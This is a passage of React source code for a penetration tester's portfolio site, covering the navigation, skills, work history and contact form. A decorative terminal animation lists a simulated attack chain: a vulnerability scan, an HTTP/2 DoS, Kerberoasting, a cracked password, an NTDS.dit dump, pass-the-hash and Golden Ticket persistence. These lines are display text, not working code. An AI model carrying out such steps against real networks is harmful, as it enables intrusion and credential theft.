                {tag}
              </span>
            ))}
          </div>
        </motion.div>

        {/* Article body */}
        <motion.article
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.6, delay: 0.3 }}
        >
          {post.sections.map((section, idx) => {
            // NOSONAR
            if (section.type === "heading") {
              return (
                <div
                  key={`h-${section.content}`}
                  className="flex items-center gap-3 mt-10 mb-4"
                >
                  <span
                    className="text-neon-green font-bold"
                    style={{ textShadow: "0 0 8px #39D36E66" }}
                  >
                    &gt;$
                  </span>
                  <h2 className="text-sm font-bold tracking-widest text-foreground uppercase">
                    {section.content}
                  </h2>
                  <div className="flex-1 h-px bg-gradient-to-r from-card-border/60 to-transparent" />
                </div>
              );
            }

            if (section.type === "paragraph") {
              return (
                <p
                  // biome-ignore lint/suspicious/noArrayIndexKey: static content
                  key={`p-${idx}`}
                  className="text-sm text-muted-foreground leading-relaxed mb-4"
                >
                  {section.content}
                </p>
              );
            }

            if (section.type === "code") {
              return (
                <CodeBlock
                  // biome-ignore lint/suspicious/noArrayIndexKey: static immutable sections
                  key={`code-${idx}`}
                  content={section.content}
                  language={section.language}
                  filename={section.filename}
                />
              );
            }

            if (section.type === "callout") {
              const isWarning = section.variant === "warning";
              return (
                <div
                  // biome-ignore lint/suspicious/noArrayIndexKey: static immutable sections
                  key={`callout-${idx}`}
                  className={`my-5 px-4 py-3 border-l-2 text-xs leading-relaxed ${
                    isWarning
                      ? "border-yellow-400/70 bg-yellow-400/5 text-yellow-300/90"
                      : "border-neon-green/70 bg-neon-green/5 text-neon-green/90"
                  }`}
                >
                  {section.content}
                </div>
              );
            }

            if (section.type === "divider") {
              return (
                <div
                  // biome-ignore lint/suspicious/noArrayIndexKey: static immutable sections
                  key={`div-${idx}`}
                  className="my-8 h-px bg-gradient-to-r from-transparent via-card-border/60 to-transparent"
                />
              );
            }

            return null;
          })}
        </motion.article>

        {/* Back button at bottom */}
        <div className="mt-16 pt-8 border-t border-card-border/60">
          <button
            type="button"
            onClick={onBack}
            className="text-xs text-neon-green border border-neon-green/50 px-4 py-2 hover:bg-neon-green/10 transition-all duration-200"
            data-ocid="blog.bottom.back.button"
          >
            [← BACK_TO_PORTFOLIO]
          </button>
        </div>
      </main>

      {/* Footer */}
      <footer className="mt-8 border-t border-card-border/60 py-6">
        <div className="max-w-4xl mx-auto px-6 text-center text-xs text-muted-foreground">
          © {new Date().getFullYear()} Anup Maurya. Built with ❤️ using{" "}
          <a
            href={`https://caffeine.ai?utm_source=caffeine-footer&utm_medium=referral&utm_content=${encodeURIComponent(typeof window !== "undefined" ? window.location.hostname : "")}`}
            target="_blank"
            rel="noreferrer"
            className="text-neon-green/60 hover:text-neon-green transition-colors"
          >
            caffeine.ai
          </a>
        </div>
      </footer>
    </div>
  );
}

// ─── Nav Links ────────────────────────────────────────────────────────────────

const NAV_LINKS: Array<[string, string, string]> = [
  ["home", "home", "nav.home.link"],
  ["skills", "skills", "nav.skills.link"],
  ["projects", "projects", "nav.projects.link"],
  ["experience", "experience", "nav.experience.link"],
  ["contact", "contact", "nav.contact.link"],
];

// ─── Terminal animation data ───────────────────────────────────────────────────

const CODE_LINES = [
  { text: "[*] Initializing scan engine v3.2.1...", type: "info" },
  { text: "[+] Target: 192.168.1.0/24", type: "success" },
  { text: "[*] Running nmap -sV -sC --script=vuln", type: "info" },
  { text: "[+] Open ports: 22/ssh, 80/http, 443/https", type: "success" },
  { text: "[*] Enumerating services...", type: "info" },
  { text: "[+] Apache/2.4.49 detected on port 80", type: "success" },
  { text: "[!] CVE-2021-41773 path traversal candidate", type: "warn" },
  { text: "[*] Checking for CVEs on port 443...", type: "info" },
  { text: "[+] CVE-2023-44487 (HTTP/2 RapidReset) found!", type: "success" },
  { text: "[*] Running exploit module [http2_rapid_reset]", type: "info" },
  { text: "[*] Sending malformed HEADERS frames...", type: "info" },
  {
    text: "[+] DoS condition triggered — server unresponsive",
    type: "success",
  },
  { text: "[*] Pivoting via SSH tunnel 22 -> 10.0.0.5", type: "info" },
  { text: "[*] Running BloodHound ingestor...", type: "info" },
  { text: "[+] Domain: CORP.LOCAL | DCs: 2 found", type: "success" },
  { text: "[*] Kerberoasting SPNs...", type: "info" },
  { text: "[+] Ticket: HTTP/webapp.corp.local — cracking", type: "success" },
  { text: "[*] Hashcat mask attack initiated...", type: "info" },
  { text: "[+] Password cracked: C0rp@dm1n2024!", type: "success" },
  { text: "[*] Dumping NTDS.dit credentials...", type: "info" },
  { text: "[+] Hash: $2y$10$abc123XYZdef456GHI789", type: "success" },
  { text: "[*] Running pass-the-hash attack...", type: "info" },
  { text: "[+] Shell obtained: uid=0(root) gid=0(root)", type: "success" },
  { text: "[+] Persistence via Golden Ticket established", type: "success" },
  { text: "[*] Scan complete. 14 vulnerabilities found.", type: "info" },
  { text: "[*] Report written to: report_2026-03-29.pdf", type: "info" },
];

function RunningCode() {
  const [visibleLines, setVisibleLines] = useState<
    { text: string; type: string; partial: string }[]
  >([]);
  const [currentLineIdx, setCurrentLineIdx] = useState(0);
  const [currentCharIdx, setCurrentCharIdx] = useState(0);
  const containerRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const line = CODE_LINES[currentLineIdx % CODE_LINES.length];
    const fullText = line.text;

    if (currentCharIdx < fullText.length) {
      const tid = setTimeout(
        () => {
          setCurrentCharIdx((c) => c + 1);
        },
        28 + Math.random() * 22,
      );
      return () => clearTimeout(tid);
    }

    const tid = setTimeout(() => {
      setVisibleLines((prev) => {
        const next = [
          ...prev,
          { text: fullText, type: line.type, partial: fullText },
        ];
        return next.slice(-18);
      });
      setCurrentLineIdx((i) => i + 1);
      setCurrentCharIdx(0);
    }, 160);
    return () => clearTimeout(tid);
  }, [currentCharIdx, currentLineIdx]);

  // biome-ignore lint/correctness/useExhaustiveDependencies: intentional trigger dep
  useEffect(() => {
    if (containerRef.current) {
      containerRef.current.scrollTop = containerRef.current.scrollHeight;
    }
  }, [currentLineIdx]);

  const currentLine = CODE_LINES[currentLineIdx % CODE_LINES.length];
  const partialText = currentLine.text.slice(0, currentCharIdx);

  const colorClass = (type: string) => {
    if (type === "success") return "text-green-400";
    if (type === "warn") return "text-yellow-400";
    return "text-green-600";
  };

  return (
    <div
      ref={containerRef}
      className="h-64 overflow-hidden font-mono text-xs leading-5 px-3 py-2 select-none"
      style={{ background: "#060d0a" }}
    >
      <div
        className="pointer-events-none absolute inset-0 z-10"
        style={{
          background:
            "repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.08) 2px, rgba(0,0,0,0.08) 4px)",
        }}
      />
      {visibleLines.map((l, i) => (
        <div
          key={`${i}-${l.text}`}
          className={`${colorClass(l.type)} whitespace-pre-wrap break-all`}
        >
          {l.text}
        </div>
      ))}
      <div
        className={`${colorClass(currentLine.type)} whitespace-pre-wrap break-all`}
      >
        {partialText}
        <span
          className="inline-block w-1.5 h-3.5 bg-green-400 align-middle ml-px"
          style={{ animation: "blink 0.8s step-end infinite" }}
        />
      </div>
    </div>
  );
}

// ─── Portfolio ─────────────────────────────────────────────────────────────────

function Portfolio() {
  const [cursorVisible, setCursorVisible] = useState(true);
  const [selectedPost, setSelectedPost] = useState<BlogPost | null>(null);

  useEffect(() => {
    const id = setInterval(() => setCursorVisible((v) => !v), 530);
    return () => clearInterval(id);
  }, []);

  if (selectedPost) {
    return (
      <BlogView post={selectedPost} onBack={() => setSelectedPost(null)} />
    );
  }

  const scrollTo = (id: string) => {
    document.getElementById(id)?.scrollIntoView({ behavior: "smooth" });
  };

  return (
    <div className="min-h-screen font-mono">
      {/* NAV */}
      <header
        className="sticky top-0 z-50 border-b border-card-border/60 bg-[#0B0F12]/95 backdrop-blur-sm"
        data-ocid="nav.panel"
      >
        <div className="max-w-5xl mx-auto px-6 py-3 flex items-center justify-between">
          <span
            className="text-neon-green font-bold text-lg tracking-widest"
            style={{ textShadow: "0 0 10px #39D36E66" }}
          >
            ANUP_MAURYA
          </span>
          <nav className="hidden md:flex items-center gap-1 text-xs text-muted-foreground">
            {NAV_LINKS.map(([id, label, ocid]) => (
              <button
                key={id}
                type="button"
                onClick={() => scrollTo(id)}
                className="px-3 py-1 hover:text-neon-green transition-colors"
                data-ocid={ocid}
              >
                [./{label}]
              </button>
            ))}
          </nav>
          <a
            href="/resume.pdf"
            download="Anup_Maurya_Resume.pdf"
            className="text-xs border border-neon-green text-neon-green px-3 py-1.5 hover:bg-neon-green/10 transition-all duration-200"
            style={{ boxShadow: "0 0 8px #39D36E33" }}
            data-ocid="nav.download_cv.button"
          >
            [DOWNLOAD_CV]
          </a>
        </div>
      </header>

      <main className="max-w-5xl mx-auto px-6">
        {/* HERO */}
        <section id="home" className="py-20 md:py-28">
          <div className="grid md:grid-cols-2 gap-12 items-center">
            <motion.div
              initial={{ opacity: 0, x: -30 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ duration: 0.7 }}
            >
              <div
                className="text-4xl md:text-5xl font-bold text-neon-green mb-4"
                style={{ textShadow: "0 0 18px #39D36E88" }}
              >
                &gt;$ whoami
                <span
                  className="inline-block w-0.5 h-10 bg-neon-green ml-1 align-middle"
                  style={{ opacity: cursorVisible ? 1 : 0 }}
                />
              </div>
              <h1 className="text-xl text-foreground font-semibold mb-1">
                Anup Maurya
              </h1>
              <p className="text-sm text-muted-foreground mb-5">
                Cybersecurity Professional{" "}
                <span className="text-neon-green/60">|</span> Penetration Tester{" "}
                <span className="text-neon-green/60">|</span> OSCP · CRTP · HTB
                CPTS
              </p>
              <p className="text-sm text-muted-foreground leading-relaxed mb-8 max-w-md">
                Seasoned cybersecurity professional with 6+ years across
                top-tier firms including TCS, PwC, Tektronix, and HPE.
                Specializing in penetration testing, attack surface management,
                and vulnerability management.
              </p>
              <div className="flex flex-wrap gap-3">
                <button
                  type="button"
                  onClick={() => scrollTo("projects")}
                  className="text-xs border border-neon-green text-neon-green px-4 py-2 hover:bg-neon-green/10 transition-all duration-200"
                  style={{ boxShadow: "0 0 8px #39D36E33" }}
                  data-ocid="hero.explore.button"
                >
                  [EXPLORE_PORTFOLIO]
                </button>
                <button
                  type="button"
                  onClick={() => scrollTo("contact")}
                  className="text-xs border border-neon-green/50 text-neon-green/80 px-4 py-2 hover:bg-neon-green/5 transition-all duration-200"
                  data-ocid="hero.contact.button"
                >
                  [GET_IN_TOUCH]
                </button>
              </div>
            </motion.div>

            {/* Monitor card */}
            <motion.div
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              transition={{ duration: 0.7, delay: 0.2 }}
              className="hidden md:block"
            >
              <div
                className="border border-neon-green/60 bg-card-bg rounded-sm overflow-hidden relative"
                style={{
                  boxShadow: "0 0 20px #39D36E33, inset 0 0 20px #39D36E08",
                }}
              >
                <div className="flex items-center gap-2 px-3 py-2 border-b border-card-border/60 bg-[#0d1719]">
                  <span className="w-3 h-3 rounded-full bg-[#FF5F57]" />
                  <span className="w-3 h-3 rounded-full bg-[#FFBD2E]" />
                  <span className="w-3 h-3 rounded-full bg-[#28CA41]" />
                  <span className="ml-2 text-xs text-muted-foreground">
                    anup@cybersec:~$ ./pentest.sh
                  </span>
                </div>
                <div className="relative">
                  <RunningCode />
                </div>
                <div className="px-4 py-3 text-xs text-neon-green/70 border-t border-card-border/40">
                  <span className="text-neon-green">&gt;$ </span>status:{" "}
                  <span className="text-neon-green animate-pulse">ACTIVE</span>{" "}
                  | clearance: <span className="text-accent">TOP_SEC</span>
                </div>
              </div>
            </motion.div>
          </div>
          <div className="mt-16 h-px bg-gradient-to-r from-transparent via-[#2FD7D7]/40 to-transparent" />
        </section>

        {/* SKILLS & CERTS */}
        <section id="skills" className="py-16">
          <SectionHeader title="SKILLS &amp; CERTIFICATIONS" />
          <div className="grid md:grid-cols-4 gap-5 mt-8">
            <SkillCard
              icon={<Shield size={22} className="text-neon-green" />}
              title="[NETWORK SECURITY]"
              items={[
                "Firewall config & IDS/IPS",
                "VPN architecture & segmentation",
                "Network traffic analysis",
                "Zero-trust implementation",
              ]}
            />
            <SkillCard
              icon={<Terminal size={22} className="text-neon-green" />}
              title="[PENETRATION TESTING]"
              items={[
                "Web app vulnerability research",
                "Exploit development & PoC",
                "Red team operations",
                "Active Directory attacks",
              ]}
            />
            <SkillCard
              icon={<Lock size={22} className="text-neon-green" />}
              title="[ATTACK SURFACE MGMT]"
              items={[
                "External asset discovery",
                "Shadow IT identification",
                "Continuous exposure monitoring",
                "Attack surface reduction",
              ]}
            />
            <SkillCard
              icon={<Bug size={22} className="text-neon-green" />}
              title="[VULNERABILITY MGMT]"
              items={[
                "Vulnerability scanning & triage",
                "Risk-based remediation prioritization",
                "CVE analysis & patch tracking",
                "Vulnerability reporting & SLAs",
              ]}
            />
          </div>
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true }}
            transition={{ duration: 0.5, delay: 0.3 }}
            className="mt-5 border border-card-border bg-card-bg rounded-sm p-5"
          >
            <div className="flex items-center gap-2 mb-4">
              <Search size={18} className="text-neon-green" />
              <span className="text-xs font-semibold text-foreground uppercase tracking-wider">
                [CERTIFICATIONS]
              </span>
            </div>
            <div className="flex flex-wrap gap-4">
              {[
                {
                  name: "OSCP",
                  full: "Offensive Security Certified Professional",
                  color: "text-neon-green",
                },
                {
                  name: "CRTP",
                  full: "Certified Red Team Professional",
                  color: "text-accent",
                },
                {
                  name: "HTB CPTS",
                  full: "HackTheBox Certified Penetration Testing Specialist",
                  color: "text-neon-green/80",
                },
              ].map((cert) => (
                <div
                  key={cert.name}
                  className="flex-1 min-w-[180px] border border-card-border/80 bg-[#0d1719] px-4 py-3 rounded-sm"
                >
                  <span className={`text-sm font-bold ${cert.color}`}>
                    {cert.name}
                  </span>
                  <p className="text-xs text-muted-foreground mt-0.5 leading-tight">
                    {cert.full}
                  </p>
                </div>
              ))}
            </div>
          </motion.div>
        </section>

        {/* PROJECTS */}
        <section id="projects" className="py-16">
          <SectionHeader title="PROJECTS / CTF WRITEUPS" />
          <div className="grid md:grid-cols-3 gap-6 mt-8">
            {PROJECT_CARDS.map((p, i) => (
              <ProjectCard
                key={p.title}
                gradient={p.gradient}
                accentColor={p.accentColor}
                tag={p.tag}
                title={p.title}
                description={p.description}
                tags={p.tags}
                index={i + 1}
                onReadMore={() => setSelectedPost(BLOG_POSTS[p.postIndex])}
              />
            ))}
          </div>
        </section>

        {/* EXPERIENCE */}
        <section id="experience" className="py-16">
          <SectionHeader title="WORK EXPERIENCE" />
          <div className="mt-10 relative pl-8">
            <div
              className="absolute left-0 top-2 bottom-2 w-px"
              style={{
                background: "linear-gradient(to bottom, #39D36E, #39D36E44)",
              }}
            />
            <ExperienceItem
              title="Cybersecurity Engineer"
              company="Hewlett Packard Enterprise (HPE)"
              period="2025 — Present"
              bullets={[
                "Driving enterprise-wide vulnerability management and attack surface reduction initiatives.",
                "Conducting penetration tests across hybrid cloud and on-prem environments.",
                "Collaborating with SOC and IT teams for continuous threat exposure management.",
              ]}
              index={1}
            />
            <ExperienceItem
              title="Security Consultant"
              company="Tektronix"
              period="2024 — 2025"
              bullets={[
                "Performed red team and penetration testing engagements for enterprise clients.",
                "Led attack surface management assessments and external exposure reviews.",
                "Delivered actionable remediation roadmaps and executive risk summaries.",
              ]}
              index={2}
            />
            <ExperienceItem
              title="Associate — Cybersecurity"
              company="PwC"
              period="2023 — 2024"
              bullets={[
                "Conducted web application, API, and infrastructure penetration tests for global clients.",
                "Performed vulnerability assessments and risk-based triage for Fortune 500 firms.",
                "Supported red team exercises and phishing simulation campaigns.",
              ]}
              index={3}
            />
            <ExperienceItem
              title="Security Analyst"
              company="Tata Consultancy Services (TCS)"
              period="2019 — 2022"
              bullets={[
                "Performed network and application security assessments across banking and telecom sectors.",
                "Built SIEM dashboards and incident detection runbooks, reducing MTTD by 35%.",
                "Earned OSCP certification during tenure; consistently exceeded performance targets.",
              ]}
              index={4}
            />
          </div>
        </section>

        {/* CONTACT */}
        <section id="contact" className="py-16">
          <SectionHeader title="CONTACT" />
          <div className="grid md:grid-cols-2 gap-10 mt-8">
            <ContactForm />
            <SocialPanel />
          </div>
        </section>
      </main>

      {/* FOOTER */}
      <footer className="mt-8 border-t border-card-border/60 py-6">
        <div className="max-w-5xl mx-auto px-6 flex flex-col md:flex-row items-center justify-between gap-4 text-xs text-muted-foreground">
          <div className="flex gap-4">
            {["home", "skills", "projects", "experience", "contact"].map(
              (id) => (
                <button
                  key={id}
                  type="button"
                  onClick={() =>
                    document
                      .getElementById(id)
                      ?.scrollIntoView({ behavior: "smooth" })
                  }
                  className="hover:text-neon-green transition-colors"
                >
                  {id}
                </button>
              ),
            )}
          </div>
          <span>
            © {new Date().getFullYear()} Anup Maurya. Built with ❤️ using{" "}
            <a
              href={`https://caffeine.ai?utm_source=caffeine-footer&utm_medium=referral&utm_content=${encodeURIComponent(typeof window !== "undefined" ? window.location.hostname : "")}`}
              target="_blank"
              rel="noreferrer"
              className="text-neon-green/60 hover:text-neon-green transition-colors"
            >
              caffeine.ai
            </a>
          </span>
        </div>
      </footer>
    </div>
  );
}

// ─── Shared components ────────────────────────────────────────────────────────

function SectionHeader({ title }: { title: string }) {
  return (
    <motion.div
      initial={{ opacity: 0, x: -20 }}
      whileInView={{ opacity: 1, x: 0 }}
      viewport={{ once: true }}
      transition={{ duration: 0.5 }}
      className="flex items-center gap-3"
    >
      <span
        className="text-neon-green text-lg font-bold"
        style={{ textShadow: "0 0 10px #39D36E66" }}
      >
        &gt;$
      </span>
      <h2
        className="text-lg font-semibold tracking-widest text-foreground uppercase"
        // biome-ignore lint/security/noDangerouslySetInnerHtml: controlled static strings
        dangerouslySetInnerHTML={{ __html: title }}
      />
      <div className="flex-1 h-px bg-gradient-to-r from-card-border/60 to-transparent" />
    </motion.div>
  );
}

function SkillCard({
  icon,
  title,
  items,
}: {
  icon: React.ReactNode;
  title: string;
  items: string[];
}) {
  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      whileInView={{ opacity: 1, y: 0 }}
      viewport={{ once: true }}
      transition={{ duration: 0.5 }}
      className="border border-card-border bg-card-bg rounded-sm p-5 hover:border-neon-green/40 transition-all duration-300"
      onMouseEnter={(e) => {
        (e.currentTarget as HTMLElement).style.boxShadow = "0 0 12px #39D36E33";
      }}
      onMouseLeave={(e) => {
        (e.currentTarget as HTMLElement).style.boxShadow = "none";
      }}
    >
      <div className="mb-3">{icon}</div>
      <h3 className="text-xs font-semibold text-foreground uppercase tracking-wider mb-3">
        {title}
      </h3>
      <ul className="space-y-1.5">
        {items.map((item) => (
          <li
            key={item}
            className="flex gap-2 items-start text-xs text-muted-foreground"
          >
            <span className="text-neon-green mt-0.5 shrink-0">▸</span>
            {item}
          </li>
        ))}
      </ul>
    </motion.div>
  );
}

function ProjectCard({
  gradient,
  accentColor,
  tag,
  title,
  description,
  tags,
  index,
  onReadMore,
}: {
  gradient: string;
  accentColor: string;
  tag: string;
  title: string;
  description: string;
  tags: string[];
  index: number;
  onReadMore?: () => void;
}) {
  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      whileInView={{ opacity: 1, y: 0 }}
      viewport={{ once: true }}
      transition={{ duration: 0.5, delay: index * 0.1 }}
      className="block border border-card-border bg-card-bg rounded-sm overflow-hidden hover:border-neon-green/40 transition-all duration-300 cursor-pointer"
      data-ocid={`projects.item.${index}`}
      onClick={onReadMore}
      onMouseEnter={(e) => {
        (e.currentTarget as HTMLElement).style.boxShadow =
          `0 0 14px ${accentColor}33`;
      }}
      onMouseLeave={(e) => {
        (e.currentTarget as HTMLElement).style.boxShadow = "none";
      }}
    >
      <div
        className={`h-32 bg-gradient-to-br ${gradient} relative overflow-hidden flex items-center justify-center`}
      >
        <div
          className="absolute inset-0 opacity-20"
          style={{
            backgroundImage: `radial-gradient(circle at 30% 50%, ${accentColor}44 0%, transparent 60%)`,
          }}
        />
        <div
          className="text-xs font-bold tracking-widest px-3 py-1 border"
          style={{ color: accentColor, borderColor: `${accentColor}66` }}
        >
          [{tag}]
        </div>
      </div>
      <div className="p-5">
        <h3 className="text-sm font-semibold text-foreground mb-2">{title}</h3>
        <p className="text-xs text-muted-foreground leading-relaxed mb-4">
          {description}
        </p>
        <div className="flex flex-wrap gap-2 mb-3">
          {tags.map((t) => (
            <span
              key={t}
              className="text-xs px-2 py-0.5 border border-card-border/80 text-muted-foreground"
            >
              {t}
            </span>
          ))}
        </div>
        <div className="flex justify-end">
          <span
            className="text-xs font-semibold"
            style={{ color: accentColor }}
          >
            [READ_WRITEUP →]
          </span>
        </div>
      </div>
    </motion.div>
  );
}

function ExperienceItem({
  title,
  company,
  period,
  bullets,
  index,
}: {
  title: string;
  company: string;
  period: string;
  bullets: string[];
  index: number;
}) {
  return (
    <motion.div
      initial={{ opacity: 0, x: -20 }}
      whileInView={{ opacity: 1, x: 0 }}
      viewport={{ once: true }}
      transition={{ duration: 0.5, delay: index * 0.1 }}
      className="relative mb-10 last:mb-0"
      data-ocid={`experience.item.${index}`}
    >
      <div
        className="absolute -left-10 top-1.5 w-3.5 h-3.5 rounded-full border-2 border-neon-green bg-card-bg"
        style={{ boxShadow: "0 0 8px #39D36E66" }}
      />
      <div
        className="border border-card-border bg-card-bg rounded-sm p-5 hover:border-neon-green/30 transition-all duration-300"
        onMouseEnter={(e) => {
          (e.currentTarget as HTMLElement).style.boxShadow =
            "0 0 12px #39D36E22";
        }}
        onMouseLeave={(e) => {
          (e.currentTarget as HTMLElement).style.boxShadow = "none";
        }}
      >
        <div className="flex flex-wrap items-start justify-between gap-2 mb-3">
          <div>
            <h3
              className="text-sm font-bold text-neon-green"
              style={{ textShadow: "0 0 8px #39D36E44" }}
            >
              {title}
            </h3>
            <p className="text-xs text-muted-foreground mt-0.5">{company}</p>
          </div>
          <span className="text-xs text-neon-green/60 border border-card-border/60 px-2 py-0.5">
            {period}
          </span>
        </div>
        <ul className="space-y-1.5">
          {bullets.map((b) => (
            <li
              key={b}
              className="flex gap-2 items-start text-xs text-muted-foreground"
            >
              <ChevronRight
                size={12}
                className="text-neon-green shrink-0 mt-0.5"
              />
              {b}
            </li>
          ))}
        </ul>
      </div>
    </motion.div>
  );
}

function ContactForm() {
  const [name, setName] = useState("");
  const [email, setEmail] = useState("");
  const [message, setMessage] = useState("");
  const { mutate, isPending, isSuccess } = useSubmitContact();

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!name.trim() || !email.trim() || !message.trim()) {
      toast.error("All fields are required");
      return;
    }
    mutate(
      { name, email, message },
      {
        onSuccess: () => {
          toast.success("Message transmitted successfully");
          setName("");
          setEmail("");
          setMessage("");
        },
        onError: () => {
          toast.error("Transmission failed. Try again.");
        },
      },
    );
  };

  return (
    <motion.form
      initial={{ opacity: 0, y: 20 }}
      whileInView={{ opacity: 1, y: 0 }}
      viewport={{ once: true }}
      transition={{ duration: 0.5 }}
      onSubmit={handleSubmit}
      className="space-y-4"
      data-ocid="contact.modal"
    >
      <div>
        <label
          htmlFor="contact-name"
          className="block text-xs text-muted-foreground mb-1.5 uppercase tracking-wider"
        >
          name:
        </label>
        <input
          id="contact-name"
          type="text"
          value={name}
          onChange={(e) => setName(e.target.value)}
          placeholder="// your name"
          className="w-full bg-card-bg border border-card-border px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground/50 focus:outline-none focus:border-neon-green/60 transition-colors"
          data-ocid="contact.name.input"
        />
      </div>
      <div>
        <label
          htmlFor="contact-email"
          className="block text-xs text-muted-foreground mb-1.5 uppercase tracking-wider"
        >
          email:
        </label>
        <input
          id="contact-email"
          type="email"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          placeholder="// your@email.com"
          className="w-full bg-card-bg border border-card-border px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground/50 focus:outline-none focus:border-neon-green/60 transition-colors"
          data-ocid="contact.email.input"
        />
      </div>
      <div>
        <label
          htmlFor="contact-message"
          className="block text-xs text-muted-foreground mb-1.5 uppercase tracking-wider"
        >
          message:
        </label>
        <textarea
          id="contact-message"
          value={message}
          onChange={(e) => setMessage(e.target.value)}
          placeholder="// describe your security needs..."
          rows={5}
          className="w-full bg-card-bg border border-card-border px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground/50 focus:outline-none focus:border-neon-green/60 transition-colors resize-none"
          data-ocid="contact.message.textarea"
        />
      </div>
      <button
        type="submit"
        disabled={isPending || isSuccess}
        className="w-full border border-neon-green text-neon-green text-xs py-3 uppercase tracking-widest hover:bg-neon-green/10 disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-200 flex items-center justify-center gap-2"
        style={{ boxShadow: "0 0 8px #39D36E33" }}
        data-ocid="contact.submit_button"
      >
        {isPending ? (
          <>
            <Loader2 size={14} className="animate-spin" />
            TRANSMITTING...
          </>
        ) : isSuccess ? (
          "[MESSAGE_SENT ✓]"
        ) : (
          "[SUBMIT_REQUEST]"
        )}
      </button>
      {isSuccess && (
        <p
          className="text-xs text-neon-green text-center"
          data-ocid="contact.success_state"
        >
          &gt;$ Message received. Response ETA: 24h.
        </p>
      )}
    </motion.form>
  );
}

function SocialPanel() {
  const links = [
    {
      icon: <Github size={18} />,
      label: "GitHub",
      sub: "github.com/RtwoPO",
      href: "https://github.com/RtwoPO",
      color: "text-foreground",
      ocid: "contact.social.link.1",
    },
    {
      icon: <Linkedin size={18} />,
      label: "LinkedIn",
      sub: "linkedin.com/in/anupmaurya",
      href: "https://linkedin.com/in/anupmaurya",
      color: "text-[#0A66C2]",
      ocid: "contact.social.link.2",
    },
    {
      icon: <Mail size={18} />,
      label: "Email",
      sub: "anup@cybersec.pro",
      href: "mailto:anup@cybersec.pro",
      color: "text-neon-green",
      ocid: "contact.social.link.3",
    },
    {
      icon: <Bug size={18} />,
      label: "HackTheBox",
      sub: "app.hackthebox.com/profile",
      href: "https://app.hackthebox.com/users/0",
      color: "text-neon-green/80",
      ocid: "contact.social.link.4",
    },
    {
      icon: <Shield size={18} />,
      label: "TryHackMe",
      sub: "tryhackme.com/p/anupmaurya",
      href: "https://tryhackme.com/p/anupmaurya",
      color: "text-accent",
      ocid: "contact.social.link.5",
    },
  ];

  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      whileInView={{ opacity: 1, y: 0 }}
      viewport={{ once: true }}
      transition={{ duration: 0.5, delay: 0.2 }}
      className="space-y-3"
    >
      <div className="border border-card-border bg-card-bg rounded-sm p-5 mb-4">
        <p className="text-xs text-neon-green mb-1">
          &gt;$ cat contact_info.txt
        </p>
        <p className="text-xs text-muted-foreground leading-relaxed">
          Available for security consulting, red team engagements, and
          vulnerability management programs. Response time typically under 24
          hours.
        </p>
      </div>
      {links.map((link) => (
        <a
          key={link.label}
          href={link.href}
          target="_blank"
          rel="noreferrer"
          className="flex items-center gap-4 border border-card-border bg-card-bg px-4 py-3 hover:border-neon-green/40 transition-all duration-200 group"
          data-ocid={link.ocid}
          onMouseEnter={(e) => {
            (e.currentTarget as HTMLElement).style.boxShadow =
              "0 0 10px #39D36E22";
          }}
          onMouseLeave={(e) => {
            (e.currentTarget as HTMLElement).style.boxShadow = "none";
          }}
        >
          <span className={link.color}>{link.icon}</span>
          <div>
            <div className="text-xs font-semibold text-foreground">
              {link.label}
            </div>
            <div className="text-xs text-muted-foreground">{link.sub}</div>
          </div>
          <ExternalLink
            size={12}
            className="ml-auto text-muted-foreground/50 group-hover:text-neon-green transition-colors"
          />
        </a>
      ))}
    </motion.div>
  );
}
